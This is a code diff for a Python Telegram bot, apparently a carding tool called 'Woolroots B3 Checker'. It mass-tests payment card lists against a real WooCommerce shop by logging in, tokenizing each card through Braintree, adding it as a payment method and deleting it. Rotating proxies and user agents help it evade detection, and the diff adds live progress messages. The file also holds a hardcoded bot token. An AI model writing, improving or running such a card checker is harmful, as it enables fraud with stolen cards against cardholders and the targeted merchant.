@@ -1,7 +1,7 @@
 """
-Woolroots B3 Checker — Simple Version
+Woolroots B3 Checker v7 — Live UI Edition
 Owner: @DarkCarder05
-No env vars. Direct run.
+Token & Owner updated.
 """
 import os, re, time, base64, random, uuid, threading, logging, itertools
 from threading import Lock
@@ -14,11 +14,11 @@ logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=lo
 logger = logging.getLogger("wool")
 
 # ═══════════════════════════════════════════════════════════
-# CONFIG — direct values
+# CONFIG
 # ═══════════════════════════════════════════════════════════
 BOT_TOKEN   = "8031306974:AAGj-WcGWWeapvJO1VjQf6zp_cqNSjyiBHs"
 OWNER_ID    = 7077294261
-OWNER_TAG   = "@who4sh"
+OWNER_TAG   = "@DarkCarder05"
 BOT_NAME    = "TON B3 CHECKER"
 
 SITE        = "https://www.woolroots.com"
@@ -226,9 +226,54 @@ def ensure_clean_slate(session):
         pass
 
 # ═══════════════════════════════════════════════════════════
-# CORE
+# UI HELPERS
 # ═══════════════════════════════════════════════════════════
-def check_card(line):
+def _edit_progress(chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
+                   masked_card, stage_text, start, status_emoji):
+    elapsed = time.time() - start
+    speed = i / max(elapsed, 1)
+
+    bar_len = 12
+    filled = int(bar_len * i / total) if total else 0
+    bar = "▰" * filled + "▱" * (bar_len - filled)
+    pct = int(100 * i / total) if total else 0
+
+    text = (
+        "👑 <b>LIVE MASS CHECK</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "📊 <b>Progress:</b> <code>" + str(i) + "/" + str(total) + "</code>\n"
+        "<code>" + bar + "</code> <b>" + str(pct) + "%</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "💳 <b>Current CC:</b>\n"
+        "<code>" + str(masked_card) + "</code>\n\n"
+        + str(stage_text) + "\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "📈 <b>Stats:</b>\n"
+        "💎 <code>" + str(ok) + "</code>  "
+        "❌ <code>" + str(bad) + "</code>  "
+        "⚠️ <code>" + str(risk) + "</code>  "
+        "💀 <code>" + str(err) + "</code>  "
+        "🧹 <code>" + str(del_fail) + "</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "⏱ <b>Time:</b> <code>" + str(int(elapsed)) + "s</code>  "
+        "⚡ <b>Speed:</b> <code>" + str(round(speed, 2)) + "/s</code>\n"
+        "🛡 <b>Proxy:</b> <code>rotating</code>"
+    )
+
+    try:
+        bot.edit_message_text(
+            chat_id=chat_id, message_id=msg_id,
+            text=text, parse_mode="HTML"
+        )
+    except Exception as ex:
+        if "not modified" not in str(ex).lower():
+            logger.warning("edit fail: " + str(ex)[:60])
+
+# ═══════════════════════════════════════════════════════════
+# CORE — with live logs
+# ═══════════════════════════════════════════════════════════
+def check_card_with_logs(line, chat_id, msg_id, i, total,
+                         ok, bad, risk, err, del_fail, start):
     parsed = parse_card(line)
     if not parsed:
         return {
@@ -236,19 +281,35 @@ def check_card(line):
             "bin": "-", "bank": "-", "country": "-",
             "deleted": None, "delete_msg": "", "proxy": "-"
         }
+
+    cc, mm, yy, cvv = parsed
+    masked = cc[:6] + "******" + cc[-4:]
+
     last_result = None
     for attempt in range(1, PROXY_MAX_RETRIES + 1):
         proxy = next_proxy()
-        r = _attempt_check(parsed, proxy)
+        r = _attempt_check_with_logs(
+            parsed, proxy, chat_id, msg_id, i, total,
+            ok, bad, risk, err, del_fail, start, masked
+        )
         if r["status"] != "proxy_dead":
             return r
         last_result = r
+
+        _edit_progress(
+            chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
+            masked,
+            "🔁 <b>Stage:</b> ⚠️ Proxy dead — retry " + str(attempt) + "/" + str(PROXY_MAX_RETRIES),
+            start, "🟡 Retrying"
+        )
         time.sleep(1.5)
+
     last_result["status"] = "error"
     last_result["response"] = "ALL_PROXIES_FAILED"
     return last_result
 
-def _attempt_check(parsed, proxy):
+def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
+                             ok, bad, risk, err, del_fail, start, masked):
     cc, mm, yy, cvv = parsed
     proxies = proxy_dict(proxy)
     ua = rand_ua()
@@ -263,12 +324,20 @@ def _attempt_check(parsed, proxy):
         "deleted": None, "delete_msg": "", "proxy": masked_proxy(proxy)
     }
 
+    def log(stage):
+        _edit_progress(
+            chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
+            masked, stage, start, "🟢 Running"
+        )
+
     try:
+        log("🔑 <b>Stage:</b> 🌐 Opening login page")
         r = s.get(LOGIN_URL, timeout=25)
         m = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', r.text)
         if not m:
             return _err("LOGIN_NONCE_FAIL", base)
 
+        log("🔐 <b>Stage:</b> 🔓 Logging in...")
         r = s.post(
             LOGIN_URL,
             headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": LOGIN_URL},
@@ -282,14 +351,17 @@ def _attempt_check(parsed, proxy):
         if "logout" not in r.text.lower() and "/my-account" not in r.url:
             return _err("LOGIN_FAIL", base)
 
+        log("🧹 <b>Stage:</b> 🗑 Cleaning old payment methods")
         ensure_clean_slate(s)
 
+        log("📄 <b>Stage:</b> 📥 Loading payment page")
         r = s.get(ADD_PM_URL, headers={"Referer": LOGIN_URL}, timeout=25)
         m = re.search(r'"client_token_nonce":"(.*?)"', r.text)
         if not m:
             return _err("NO_CLIENT_NONCE", base)
         client_nonce = m.group(1)
 
+        log("🔗 <b>Stage:</b> 🎫 Getting Braintree token")
         r = s.post(
             AJAX_URL,
             headers={
@@ -312,6 +384,7 @@ def _attempt_check(parsed, proxy):
             return _err("NO_AUTH_FP", base)
         auth_fp = m.group(1)
 
+        log("💳 <b>Stage:</b> 🔍 Tokenizing card at Braintree")
         bt_headers = {
             "authority": "payments.braintree-api.com",
             "authorization": "Bearer " + auth_fp,
@@ -345,19 +418,25 @@ def _attempt_check(parsed, proxy):
             return _err("BT_BAD_RESPONSE", base)
 
         if "errors" in j:
-            err = str(j["errors"]).lower()
-            if "cvv" in err or "security code" in err:
+            err_str = str(j["errors"]).lower()
+            if "cvv" in err_str or "security code" in err_str:
+                log("❌ <b>Stage:</b> 🚫 CVV mismatch")
                 return _ok("declined", "CVV_MISMATCH", cc, base)
-            if "expired" in err or "expiration" in err:
+            if "expired" in err_str or "expiration" in err_str:
+                log("❌ <b>Stage:</b> 🚫 Expired card")
                 return _ok("declined", "EXPIRED_CARD", cc, base)
-            if "invalid" in err or "not a valid" in err or "invalid number" in err:
+            if "invalid" in err_str or "not a valid" in err_str or "invalid number" in err_str:
+                log("❌ <b>Stage:</b> 🚫 Invalid card number")
                 return _ok("declined", "INVALID_CARD", cc, base)
-            return _ok("declined", "BT: " + err[:60], cc, base)
+            log("❌ <b>Stage:</b> 🚫 " + err_str[:40])
+            return _ok("declined", "BT: " + err_str[:60], cc, base)
 
         token = (j.get("data", {}).get("tokenizeCreditCard", {}) or {}).get("token")
         if not token:
+            log("❌ <b>Stage:</b> 🚫 No token from Braintree")
             return _ok("declined", "NO_TOKEN_FROM_BT", cc, base)
 
+        log("📤 <b>Stage:</b> 💾 Adding card to site")
         r = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
         m = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text)
         if not m:
@@ -404,6 +483,7 @@ def _attempt_check(parsed, proxy):
 
         added = any(k in low for k in ["new payment method added", "payment method successfully added", "successfully added"])
         if added:
+            log("✅ <b>Stage:</b> 💎 Card ADDED — cleaning up")
             r2 = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
             del_url = extract_delete_link(r2.text, SITE)
             deleted = None
@@ -419,17 +499,24 @@ def _attempt_check(parsed, proxy):
             return _ok("approved", msg or "CARD ADDED", cc, base)
 
         if "duplicate card exists" in low:
+            log("❌ <b>Stage:</b> 🚫 Duplicate card")
             return _ok("declined", "DUPLICATE_CARD", cc, base)
         if "insufficient" in low or "not enough" in low:
+            log("❌ <b>Stage:</b> 🚫 Insufficient funds")
             return _ok("declined", "INSUFFICIENT_FUNDS", cc, base)
         if "cvv" in low or "security code" in low:
+            log("❌ <b>Stage:</b> 🚫 CVV mismatch")
             return _ok("declined", "CVV_MISMATCH", cc, base)
         if "gateway rejected" in low and "avs" in low:
+            log("❌ <b>Stage:</b> 🚫 Gateway rejected (AVS)")
             return _ok("declined", "GATEWAY_REJECTED:AVS", cc, base)
         if "risk" in low or "fraud" in low:
+            log("⚠️ <b>Stage:</b> 🛡 Risk flagged")
             return _ok("declined", msg[:100] or "RISK", cc, base)
         if any(k in low for k in ["declined", "invalid", "expired", "failed", "error"]):
+            log("❌ <b>Stage:</b> 🚫 " + (msg[:40] or "Declined"))
             return _ok("declined", msg[:100] or "DECLINED", cc, base)
+        log("❌ <b>Stage:</b> 🚫 " + (msg[:40] or "Declined"))
         return _ok("declined", msg[:100] or "DECLINED", cc, base)
 
     except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as pe:
@@ -440,8 +527,10 @@ def _attempt_check(parsed, proxy):
             "deleted": None, "delete_msg": "", "proxy": masked_proxy(proxy)
         }
     except requests.exceptions.Timeout:
+        log("💀 <b>Stage:</b> ⏱ Timeout")
         return _err("TIMEOUT", base)
     except Exception as ex:
+        log("💀 <b>Stage:</b> " + str(ex)[:40])
         return _err("EXC: " + str(ex)[:60], base)
     finally:
         try:
@@ -485,7 +574,7 @@ def cmd_start(msg):
         "📖 <b>How to use:</b>\n"
         "1. Send <code>.txt</code> file with cards\n"
         "2. Reply to it with <code>/chk</code>\n"
-        "3. Watch hits 💎\n\n"
+        "3. Watch live stages 💎\n\n"
         "━━━━━━━━━━━━━━━━━━━\n"
         "🤖 <b>Bot By " + OWNER_TAG + "</b>"
     )
@@ -535,7 +624,7 @@ def cmd_chk(msg):
         "📍 File: <code>" + str(doc.file_name) + "</code>\n"
         "💵 Cards: <code>" + str(len(parsed)) + "</code>\n"
         "🛡 Proxies: <code>" + str(len(PROXIES)) + "</code>\n\n"
-        "<i>Rotating proxies + UAs 🔄</i>"
+        "<i>Live stage logs will appear below 🔄</i>"
     )
     bot.reply_to(msg, start_text)
     threading.Thread(target=run_check, args=(msg.chat.id, parsed), daemon=True).start()
@@ -544,27 +633,53 @@ def run_check(chat_id, cards):
     total = len(cards)
     ok = bad = risk = err = 0
     delete_fail = 0
-    status_msg = bot.send_message(chat_id, "⚡ <b>0/" + str(total) + "</b>")
     start = time.time()
+
+    header = (
+        "👑 <b>LIVE MASS CHECK</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "💳 <b>Total:</b> <code>" + str(total) + "</code>\n"
+        "🛡 <b>Proxies:</b> <code>" + str(len(PROXIES)) + "</code>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔄 <b>Starting...</b>"
+    )
+    status_msg = bot.send_message(chat_id, header)
+    msg_id = status_msg.message_id
+
     for i, card in enumerate(cards, 1):
         if STOP_FLAG["stop"]:
             try:
                 bot.edit_message_text(
-                    chat_id=chat_id, message_id=status_msg.message_id,
-                    text="🚫 Stopped at " + str(i-1) + "/" + str(total),
+                    chat_id=chat_id, message_id=msg_id,
+                    text="🚫 <b>Stopped at " + str(i-1) + "/" + str(total) + "</b>",
                     parse_mode="HTML"
                 )
             except:
                 pass
             break
+
+        parsed = parse_card(card)
+        masked = "invalid"
+        if parsed:
+            cc = parsed[0]
+            masked = cc[:6] + "******" + cc[-4:]
+
+        _edit_progress(
+            chat_id, msg_id, i, total, ok, bad, risk, err, delete_fail,
+            masked, "⚡ <b>Stage:</b> 🚀 Initializing...",
+            start, "🟡 Starting"
+        )
+
         try:
-            r = check_card(card)
+            r = check_card_with_logs(card, chat_id, msg_id, i, total,
+                                     ok, bad, risk, err, delete_fail, start)
         except Exception as ex:
             r = {
                 "status": "error", "response": "EXC: " + str(ex), "card": card,
                 "bin": "-", "bank": "-", "country": "-",
                 "deleted": None, "delete_msg": "", "proxy": "-"
             }
+
         if r["status"] == "approved":
             ok += 1
             if r.get("deleted") is False:
@@ -576,39 +691,41 @@ def run_check(chat_id, cards):
             bad += 1
         else:
             err += 1
-        if i % 2 == 0 or i == total:
-            try:
-                elapsed = time.time() - start
-                txt = (
-                    "⚡ <b>" + str(i) + "/" + str(total) + "</b>\n"
-                    "💎 " + str(ok) + "  ❌ " + str(bad) + "  ⚠️ " + str(risk) + "  💀 " + str(err) + "\n"
-                    "🕯 " + str(int(elapsed)) + "s"
-                )
-                bot.edit_message_text(
-                    chat_id=chat_id, message_id=status_msg.message_id,
-                    text=txt, parse_mode="HTML"
-                )
-            except:
-                pass
+
+        if r["status"] == "approved":
+            final_stage = "💎 <b>Stage:</b> ✅ ADDED & DELETED"
+        elif r["status"] == "declined":
+            final_stage = "❌ <b>Stage:</b> 🚫 " + str(r["response"])[:40]
+        elif r["status"] == "risk":
+            final_stage = "⚠️ <b>Stage:</b> 🛡 Risk flagged"
+        else:
+            final_stage = "💀 <b>Stage:</b> " + str(r["response"])[:40]
+
+        _edit_progress(
+            chat_id, msg_id, i, total, ok, bad, risk, err, delete_fail,
+            masked, final_stage, start, "🟢 Done"
+        )
+
         time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
 
     elapsed = time.time() - start
     summary = (
         "👑 <b>CHECK FINISHED</b>\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        "📊 Total: <code>" + str(total) + "</code>\n"
-        "💎 Approved: <code>" + str(ok) + "</code>\n"
-        "❌ Declined: <code>" + str(bad) + "</code>\n"
-        "⚠️ Risk: <code>" + str(risk) + "</code>\n"
-        "💀 Error: <code>" + str(err) + "</code>\n"
-        "🧹 Delete fail: <code>" + str(delete_fail) + "</code>\n\n"
-        "🕯 Time: <code>" + str(int(elapsed)) + "s</code>\n\n"
-        "━━━━━━━━━━━━━━━━━━━\n"
-        "🤖 <b>Bot By " + OWNER_TAG + "</b>"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "📊 <b>Total:</b> <code>" + str(total) + "</code>\n"
+        "💎 <b>Approved:</b> <code>" + str(ok) + "</code>\n"
+        "❌ <b>Declined:</b> <code>" + str(bad) + "</code>\n"
+        "⚠️ <b>Risk:</b> <code>" + str(risk) + "</code>\n"
+        "💀 <b>Error:</b> <code>" + str(err) + "</code>\n"
+        "🧹 <b>Delete fail:</b> <code>" + str(delete_fail) + "</code>\n\n"
+        "⏱ <b>Time:</b> <code>" + str(int(elapsed)) + "s</code>\n"
+        "⚡ <b>Speed:</b> <code>" + str(round(total/max(elapsed,1), 2)) + " cards/s</code>\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🤖 <b>" + OWNER_TAG + "</b>"
     )
     try:
         bot.edit_message_text(
-            chat_id=chat_id, message_id=status_msg.message_id,
+            chat_id=chat_id, message_id=msg_id,
             text=summary, parse_mode="HTML"
         )
     except:
